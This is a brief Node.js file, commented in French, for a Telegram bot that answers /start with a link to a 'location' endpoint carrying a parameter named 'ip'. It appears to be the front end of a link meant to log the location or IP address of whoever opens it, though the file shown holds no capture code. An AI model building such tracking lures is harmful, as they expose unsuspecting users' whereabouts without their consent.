const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');

const token = 'VOTRE_TOKEN'; // Remplacez par votre token Telegram
const chatId = 'VOTRE_CHAT_ID'; // Remplacez par votre chat ID

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(bodyParser.json());

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const link = `https://your-domain.railway.app/functions/location?ip=${chatId}`;
    bot.sendMessage(chatId, `Cliquez sur ce lien: ${link}`);
});

module.exports = app;
